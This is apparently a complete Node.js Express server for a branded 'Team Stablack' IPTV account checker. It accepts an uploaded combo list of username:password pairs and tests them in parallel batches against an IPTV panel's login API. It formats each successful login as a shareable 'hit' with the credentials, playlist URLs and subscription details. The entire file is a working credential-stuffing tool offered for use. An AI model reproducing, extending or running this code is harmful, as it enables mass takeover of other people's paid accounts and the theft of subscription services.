const express = require('express');
const multer = require('multer');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Configurar multer para manejar archivos (usando memory storage para no guardar en disco)
const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 10 * 1024 * 1024 } // 10MB límite
});

// Mapeo de timezone a código de país (el mismo que tenías)
const timezoneToCountryCode = {
    "Europe/Andorra":"AD", "Asia/Dubai":"AE", "Asia/Kabul":"AF", "America/Antigua":"AG",
    "America/Anguilla":"AI", "Europe/Tirane":"AL", "Asia/Yerevan":"AM", "Africa/Luanda":"AO",
    "Antarctica/McMurdo":"AQ", "America/Argentina/Buenos_Aires":"AR", "Pacific/Pago_Pago":"AS",
    "Europe/Vienna":"AT", "Australia/Sydney":"AU", "America/Aruba":"AW", "Europe/Mariehamn":"AX",
    "Asia/Baku":"AZ", "Europe/Sarajevo":"BA", "America/Barbados":"BB", "Asia/Dhaka":"BD",
    "Europe/Brussels":"BE", "Africa/Ouagadougou":"BF", "Europe/Sofia":"BG", "Asia/Bahrain":"BH",
    "Africa/Bujumbura":"BI", "Africa/Porto-Novo":"BJ", "America/St_Barthelmy":"BL",
    "Atlantic/Bermuda":"BM", "Asia/Brunei":"BN", "America/La_Paz":"BO", "America/Noronha":"BR",
    "America/Nassau":"BS", "Asia/Thimphu":"BT", "Africa/Gaborone":"BW", "Europe/Minsk":"BY",
    "America/Belize":"BZ", "America/Toronto":"CA", "Indian/Cocos":"CC", "Africa/Kinshasa":"CD",
    "Africa/Bangui":"CF", "Africa/Brazzaville":"CG", "Europe/Zurich":"CH", "Africa/Abidjan":"CI",
    "Pacific/Rarotonga":"CK", "America/Santiago":"CL", "Africa/Douala":"CM", "Asia/Shanghai":"CN",
    "America/Bogota":"CO", "America/Costa_Rica":"CR", "America/Havana":"CU", "Atlantic/Cape_Verde":"CV",
    "America/Curacao":"CW", "Indian/Christmas":"CX", "Asia/Nicosia":"CY", "Europe/Prague":"CZ",
    "Europe/Berlin":"DE", "Africa/Djibouti":"DJ", "Europe/Copenhagen":"DK", "America/Dominica":"DM",
    "America/Santo_Domingo":"DO", "Africa/Algiers":"DZ", "America/Guayaquil":"EC", "Europe/Tallinn":"EE",
    "Africa/Cairo":"EG", "Africa/Asmara":"ER", "Europe/Madrid":"ES", "Africa/Addis_Abeba":"ET",
    "Europe/Helsinki":"FI", "Pacific/Fiji":"FJ", "Atlantic/Stanley":"FK", "Pacific/Chuuk":"FM",
    "Atlantic/Faroe":"FO", "Europe/Paris":"FR", "Africa/Libreville":"GA", "Europe/London":"GB",
    "America/Grenada":"GD", "Asia/Tbilisi":"GE", "America/Cayenne":"GF", "Europe/Guernsey":"GG",
    "Africa/Accra":"GH", "Europe/Gibraltar":"GI", "America/Godthab":"GL", "Africa/Banjul":"GM",
    "Africa/Conakry":"GN", "America/Guadeloupe":"GP", "Africa/Malabo":"GQ", "Europe/Athens":"GR",
    "Atlantic/South_Georgia":"GS", "America/Guatemala":"GT", "Pacific/Guam":"GU", "Africa/Bissau":"GW",
    "America/Guyana":"GY", "Asia/Hong_Kong":"HK", "America/Tegucigalpa":"HN", "Europe/Zagreb":"HR",
    "America/Port-au-Prince":"HT", "Europe/Budapest":"HU", "Asia/Jakarta":"ID", "Europe/Dublin":"IE",
    "Asia/Jerusalem":"IL", "Europe/Isle_of_Man":"IM", "Asia/Kolkata":"IN", "Indian/Chagos":"IO",
    "Asia/Baghdad":"IQ", "Asia/Tehran":"IR", "Atlantic/Reykjavik":"IS", "Europe/Rome":"IT",
    "Europe/Jersey":"JE", "America/Jamaica":"JM", "Asia/Amman":"JO", "Asia/Tokyo":"JP",
    "Africa/Nairobi":"KE", "Asia/Bishkek":"KG", "Asia/Phnom_Penh":"KH", "Pacific/Tarawa":"KI",
    "Indian/Comoro":"KM", "America/St_Kitts":"KN", "Asia/Pyongyang":"KP", "Asia/Seoul":"KR",
    "Asia/Kuwait":"KW", "America/Cayman":"KY", "Asia/Almaty":"KZ", "Asia/Vientiane":"LA",
    "Asia/Beirut":"LB", "America/St_Lucia":"LC", "Europe/Vaduz":"LI", "Asia/Colombo":"LK",
    "Africa/Monrovia":"LR", "Africa/Maseru":"LS", "Europe/Vilnius":"LT", "Europe/Luxembourg":"LU",
    "Europe/Riga":"LV", "Africa/Tripoli":"LY", "Africa/Casablanca":"MA", "Europe/Monaco":"MC",
    "Europe/Chisinau":"MD", "Europe/Podgorica":"ME", "America/Marigot":"MF", "Indian/Antananarivo":"MG",
    "Pacific/Majuro":"MH", "Europe/Skopje":"MK", "Africa/Bamako":"ML", "Asia/Yangon":"MM",
    "Asia/Ulaanbaatar":"MN", "Asia/Macau":"MO", "Pacific/Saipan":"MP", "America/Martinique":"MQ",
    "Africa/Nouakchott":"MR", "America/Montserrat":"MS", "Europe/Malta":"MT", "Indian/Mauritius":"MU",
    "Indian/Maldives":"MV", "Africa/Blantyre":"MW", "America/Mexico_City":"MX", "Asia/Kuala_Lur":"MY",
    "Africa/Maputo":"MZ", "Africa/Windhoek":"NA", "Pacific/Noumea":"NC", "Africa/Niamey":"NE",
    "Pacific/Norfolk":"NF", "Africa/Lagos":"NG", "America/Managua":"NI", "Europe/Amsterdam":"NL",
    "Europe/Oslo":"NO", "Asia/Kathmandu":"NP", "Pacific/Nauru":"NR", "Pacific/Niue":"NU",
    "Pacific/Auckland":"NZ", "Asia/Muscat":"OM", "America/Panama":"PA", "America/Lima":"PE",
    "Pacific/Tahiti":"PF", "Pacific/Port_Moresby":"PG", "Asia/Manila":"PH", "Asia/Karachi":"PK",
    "Europe/Warsaw":"PL", "America/Miquelon":"PM", "Pacific/Pitcairn":"PN", "America/Puerto_Rico":"PR",
    "Asia/Gaza":"PS", "Europe/Lisbon":"PT", "Pacific/Palau":"PW", "America/Asuncion":"PY",
    "Asia/Qatar":"QA", "Indian/Reunion":"RE", "Europe/Bucharest":"RO", "Europe/Belgrade":"RS",
    "Europe/Moscow":"RU", "Africa/Kigali":"RW", "Asia/Riyadh":"SA", "Pacific/Guadalcanal":"SB",
    "Indian/Mahe":"SC", "Africa/Khartoum":"SD", "Europe/Stockholm":"SE", "Asia/Singapore":"SG",
    "Atlantic/St_Helena":"SH", "Europe/Ljubljana":"SI", "Arctic/Longyearbyen":"SJ", "Europe/Bratislava":"SK",
    "Africa/Freetown":"SL", "Europe/San_Marino":"SM", "Africa/Dakar":"SN", "Africa/Mogadishu":"SO",
    "America/Paramaribo":"SR", "Africa/Juba":"SS", "Africa/Sao_Tome":"ST", "America/El_Salvador":"SV",
    "America/Lower_Princes":"SX", "Asia/Damascus":"SY", "Africa/Mbabane":"SZ", "America/Grand_Turk":"TC",
    "Africa/Ndjamena":"TD", "Indian/Kerguelen":"TF", "Africa/Lome":"TG", "Asia/Bangkok":"TH",
    "Asia/Dushanbe":"TJ", "Pacific/Fakaofo":"TK", "Asia/Dili":"TL", "Asia/Ashgabat":"TM",
    "Africa/Tunis":"TN", "Pacific/Tongatapu":"TO", "Europe/Istanbul":"TR", "America/Port_of_Spain":"TT",
    "Pacific/Funafuti":"TV", "Asia/Taipei":"TW", "Africa/Dar_es_Salaam":"TZ", "Europe/Kiev":"UA",
    "Africa/Kampala":"UG", "America/New_York":"US", "America/Montevideo":"UY", "Asia/Tashkent":"UZ",
    "Europe/Vatican":"VA", "America/St_Vincent":"VC", "America/Caracas":"VE", "America/Tortola":"VG",
    "America/St_Thomas":"VI", "Asia/Ho_Chi_Minh":"VN", "Pacific/Efate":"VU", "Pacific/Wallis":"WF",
    "Pacific/Apia":"WS", "Asia/Aden":"YE", "Indian/Mayotte":"YT", "Africa/Johannesburg":"ZA",
    "Africa/Lusaka":"ZM", "Africa/Harare":"ZW"
};

function getFlagFromTimezone(timezone) {
    if (!timezone) return { flag: "❓", code: "N/A" };
    const countryCode = timezoneToCountryCode[timezone];
    if (!countryCode) return { flag: "❓", code: "N/A" };
    const flag = countryCode.toUpperCase().split("").map(char => 
        String.fromCodePoint(char.charCodeAt(0) + 127397)).join("");
    return { flag, code: countryCode };
}

function limparHost(host) {
    return host.replace(/^https?:\/\//i, "").trim();
}

async function fetchComTimeout(resource, options = {}) {
    const { timeout = 8000 } = options;
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
        const response = await fetch(resource, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
    } catch (e) {
        clearTimeout(id);
        throw e;
    }
}

function formatCreatedDate(unix) {
    if (!unix || isNaN(unix) || unix == 0) return 'None';
    const d = new Date(unix * 1000);
    const day = ('0' + d.getDate()).slice(-2);
    const month = ('0' + (d.getMonth() + 1)).slice(-2);
    const year = d.getFullYear();
    return `${day}.${month}.${year}`;
}

async function getGeoLocation(hostOrIp) {
    try {
        const response = await fetchComTimeout(`http://ip-api.com/json/${hostOrIp}?fields=status,country,countryCode,city`);
        const data = await response.json();
        if (data.status === 'success') {
            return data;
        }
        return { country: 'N/A', city: 'N/A', countryCode: 'N/A' };
    } catch (e) {
        return { country: 'N/A', city: 'N/A', countryCode: 'N/A' };
    }
}

async function getRealUserData(host, user, pass, printCategories) {
    const baseUrl = `http://${host}/player_api.php?username=${user}&password=${pass}`;
    try {
        const userInfo = await fetchComTimeout(baseUrl).then(res => res.ok ? res.json() : Promise.reject('Invalid credentials'));

        if (!userInfo.user_info || userInfo.user_info.auth !== 1) return null;

        let categoryPromises = { live: Promise.resolve([]), vod: Promise.resolve([]), series: Promise.resolve([]) };
        const fetchCategory = action => fetchComTimeout(`${baseUrl}&action=${action}`).then(res => res.ok ? res.json() : []).catch(() => []);
        
        if (printCategories) {
            categoryPromises.live = fetchCategory('get_live_categories');
            categoryPromises.vod = fetchCategory('get_vod_categories');
            categoryPromises.series = fetchCategory('get_series_categories');
        }
        
        const fetchAndCount = (action) => fetchComTimeout(`${baseUrl}&action=${action}`)
            .then(res => res.ok ? res.json() : [])
            .then(data => Array.isArray(data) ? data.length : 0)
            .catch(() => 0);

        const liveCountPromise = (userInfo.user_info.live_streams_count !== undefined && userInfo.user_info.live_streams_count > 0)
            ? Promise.resolve(userInfo.user_info.live_streams_count) 
            : fetchAndCount('get_live_streams');

        const vodCountPromise = (userInfo.user_info.vod_streams_count !== undefined && userInfo.user_info.vod_streams_count > 0)
            ? Promise.resolve(userInfo.user_info.vod_streams_count) 
            : fetchAndCount('get_vod_streams');
            
        const seriesCountPromise = (userInfo.user_info.series_count !== undefined && userInfo.user_info.series_count > 0)
            ? Promise.resolve(userInfo.user_info.series_count) 
            : fetchAndCount('get_series');

        const [live_categories, vod_categories, series_categories, live_streams_count, vod_streams_count, series_count] = 
            await Promise.all([
                categoryPromises.live,
                categoryPromises.vod,
                categoryPromises.series,
                liveCountPromise,
                vodCountPromise,
                seriesCountPromise
            ]);
        
        return {
            ...userInfo.user_info,
            server_info: userInfo.server_info,
            timezone: userInfo.server_info?.timezone,
            live_streams_count,
            vod_streams_count,
            series_count,
            live_categories,
            vod_categories,
            series_categories,
        };
    } catch (error) {
        console.warn(`API Error for ${user}:`, error.message || error);
        return null;
    }
}

function formatarHit(info, host, user, pass, nick, emojis, config, geoLocation) {
    let timezoneText;
    if (!info.timezone || info.timezone.toUpperCase() === 'UTC') {
        timezoneText = `UTC 🏴‍☠️`;
    } else {
        const { flag, code } = getFlagFromTimezone(info.timezone);
        timezoneText = `${info.timezone} ${flag} [${code}]`;
    }

    let locationText = 'N/A';
    if (geoLocation.countryCode && geoLocation.countryCode !== 'N/A') {
        const flag = geoLocation.countryCode.toUpperCase().split('').map(char => 
            String.fromCodePoint(char.charCodeAt(0) + 127397)).join('');
        locationText = `${geoLocation.country}/${geoLocation.city} ${flag} [${geoLocation.countryCode}]`;
    }

    const messageText = info.message && info.message.trim() !== '' ? info.message : 'IPTV FOR FREE!';
    const realServerUrl = `http://${info.server_info.url}:${info.server_info.port}`;
    
    let endsLine = '';
    let durationLine = '';

    if (!info.exp_date || isNaN(info.exp_date) || info.exp_date == 0) {
        endsLine = `${emojis.expira} E𝙽𝙳𝚂 ➠ «[🤴UNLIMITED🤴]»`;
    } else {
        const formattedEndDate = new Date(info.exp_date * 1000).toLocaleDateString('en-GB', {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        });
        endsLine = `${emojis.expira} E𝙽𝙳𝚂 ➠ ${formattedEndDate}`;

        const now = new Date();
        const expiryDate = new Date(info.exp_date * 1000);
        const diffTime = expiryDate - now;
        const daysLeft = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
        durationLine = `\n${emojis.emojiDuration} D𝚄𝚁𝙰𝚃𝙸𝙾𝙽 ➠ ${Math.max(0, daysLeft)} [D𝙰𝚈𝚂]`;
    }

    let categoryText = "";
    if (config.printCategories) {
        const formatCategoryList = (titleEmoji, title, list, separator, notFoundMsg) => {
            const cleanSeparator = separator.trim();
            if (!list || list.length === 0) {
                return `\n${titleEmoji} ${title}\n${cleanSeparator} ${notFoundMsg} ${cleanSeparator}`;
            }
            const names = list.map(c => c.category_name.toUpperCase()).join(` ${cleanSeparator} `);
            return `\n${titleEmoji} ${title}\n${cleanSeparator} ${names} ${cleanSeparator}`;
        };
        categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiChannels, "𝐂𝐀𝐍𝐀𝐋 ➠ ", info.live_categories, config.channelSeparator, "NO CHANNELS FOUND");
        categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiMovies, "𝐌𝐎𝐕𝐈𝐄𝐒 ➠ ", info.vod_categories, config.movieSeparator, "NO MOVIES FOUND");
        categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiSeries, "𝐒𝐄𝐑𝐈𝐄𝐒 ➠ ", info.series_categories, config.seriesSeparator, "NO SERIES FOUND");
    } else {
        const cleanChannelSep = config.channelSeparator.trim();
        const cleanMovieSep = config.movieSeparator.trim();
        const cleanSeriesSep = config.seriesSeparator.trim();
        categoryText = `\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiChannels} 𝐂𝐀𝐍𝐀𝐋 ➠ \n${cleanChannelSep} H I D D E N ${cleanChannelSep}\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiMovies} 𝐌𝐎𝐕𝐈𝐄𝐒 ➠ \n${cleanMovieSep} H I D D E N ${cleanMovieSep}\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiSeries} 𝐒𝐄𝐑𝐈𝐄𝐒 ➠ \n${cleanSeriesSep} H I D D E N ${cleanSeriesSep}`;
    }
    
    const now = new Date();
    const dateString = now.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
    const timeString = now.toTimeString().slice(0, 5);
    const footer = `\n━━━━━━━━━━━━━━━━━━━━\n📆 D𝙰𝚃𝙴 ➠ ${dateString}\n⏰️ T𝙸𝙼𝙴 ➠ ${timeString}\n⌨️ B𝚈 ➠ @hacker056\n👀 GRUPO ➠ Team Stablack\n${config.emojiCanal} VISITA EL CANAL(${config.canalLink || "https://whatsapp.com/channel/0029VaAMgko05MUW81inJV04"})\n━━━━━━━━━━━━━━━━━━━━\nTeam Stablack 𝚂𝙲𝙰𝙽\n━━━━━━━━━━━━━━━━━━━━`;

    let texto = 
`━━━━━━━━━━━━━━━━━━━━
[${emojis.emojiHeader}] Team Starblack Scan [${emojis.emojiHeader}]
━━━━━━━━━━━━━━━━━━━━
${emojis.servidor} H𝙾𝚂𝚃 ➠ http://${host}
${emojis.emojiRealServer} R𝙴𝙰𝙻 ➠ ${realServerUrl}
${emojis.emojiProtocol} P𝚁𝙾𝚃𝙾𝙲𝙾𝙻 ➠ http
${emojis.emojiLocation} UBICACIÓN ➠ ${locationText}
${emojis.criada} C𝚁𝙴𝙰𝙳A ➠ ${formatCreatedDate(info.created_at)}
${endsLine}${durationLine}
${emojis.usuario} USUARIO ➠ ${user}
${emojis.senha} CONTRASEÑA ➠ ${pass}
${emojis.emojiTrial} T𝚁𝙸𝙰𝙻 ➠ [${info.is_trial == 1 ? "YES" : "NO"}]
${emojis.status} ESTADO ➠ ${info.status ? info.status.toUpperCase() : "INACTIVE"}
${emojis.conexoes} MAXIMA CONEXIONES ➠ [${info.max_connections || "N/A"}]
${emojis.conectados} CONEXIONES ACTIVAS ➠ [${info.active_cons || "0"}]
${emojis.emojiTimezone} ZONA HORARIA ➠ ${timezoneText}
${emojis.emojiMessage} MENSAJE ➠ ${messageText}
${emojis.hitsPor} H𝙸𝚃𝚂 B𝚈 ➠ ${nick}
━━━━━━━━━━━━━━━━━━━━
${emojis.linkM3U} H𝙾𝚂𝚃 M𝟹𝚄 ➠ [G𝙴𝚃 H𝙾𝚂𝚃 M𝟹𝚄](http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus)
${emojis.emojiRealM3U} R𝙴𝙰𝙻 M𝟹𝚄 ➠ [G𝙴𝚃 R𝙴𝙰𝙻 M𝟹𝚄](${realServerUrl}/get.php?username=${user}&password=${pass}&type=m3u_plus)
${emojis.emojiEpgLink} E𝙿𝙶 L𝙸𝙽𝙺 ➠ [G𝙴𝚃 E𝙿𝙶 L𝙸𝙽𝙺](http://${host}/xmltv.php?username=${user}&password=${pass})
━━━━━━━━━━━━━━━━━━━━
${emojis.emojiChannels} T𝙾𝚃𝙰𝙻 CANALES ➠ [${info.live_streams_count || 0}]
${emojis.emojiMovies} T𝙾𝚃𝙰𝙻 PELICULAS ➠ [${info.vod_streams_count || 0}]
${emojis.emojiSeries} T𝙾𝚃𝙰𝙻 S𝙴𝚁𝙸𝙴𝚂 ➠ [${info.series_count || 0}]` +
categoryText +
footer;

    return texto;
}

// Endpoint principal para escanear
app.post('/api/scan', upload.single('comboFile'), async (req, res) => {
    try {
        const { host, nick, numBots, printCategories, channelSeparator, movieSeparator, seriesSeparator, canalLink, emojiCanal } = req.body;
        const emojis = JSON.parse(req.body.emojis);
        const comboText = req.file.buffer.toString('utf-8');
        
        const combos = comboText.split(/\r?\n/).filter(l => l.includes(':'));
        const total = combos.length;
        const bots = parseInt(numBots) || 20;
        
        const config = {
            printCategories: printCategories === 'true',
            channelSeparator: channelSeparator,
            movieSeparator: movieSeparator,
            seriesSeparator: seriesSeparator,
            canalLink: canalLink,
            emojiCanal: emojiCanal
        };
        
        const hits = [];
        let hitsCount = 0;
        let invalidosCount = 0;
        let testadosCount = 0;
        
        // Función para procesar un combo
        async function processCombo(combo) {
            const [user, pass] = combo.split(/:(.*)/s);
            if (!user || !pass) {
                invalidosCount++;
                testadosCount++;
                return null;
            }
            
            const realInfo = await getRealUserData(host, user, pass, config.printCategories);
            
            if (realInfo) {
                const geoLocation = await getGeoLocation(realInfo.server_info.url);
                hitsCount++;
                const hitFormatado = formatarHit(realInfo, host, user, pass, nick, emojis, config, geoLocation);
                hits.push(hitFormatado);
                testadosCount++;
                return { hit: hitFormatado, success: true };
            } else {
                invalidosCount++;
                testadosCount++;
                return null;
            }
        }
        
        // Procesar en lotes
        const comboChunks = [];
        for (let i = 0; i < combos.length; i += bots) {
            comboChunks.push(combos.slice(i, i + bots));
        }
        
        for (const chunk of comboChunks) {
            const results = await Promise.all(chunk.map(combo => processCombo(combo)));
            // Enviar progreso al cliente (opcional, mediante Server-Sent Events)
        }
        
        res.json({
            success: true,
            hits: hits,
            stats: {
                total: total,
                hits: hitsCount,
                invalidos: invalidosCount,
                testados: testadosCount
            }
        });
        
    } catch (error) {
        console.error('Error en scan:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint para health check (Render lo usa)
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(port, () => {
    console.log(`✅ Servidor corriendo en http://localhost:${port}`);
});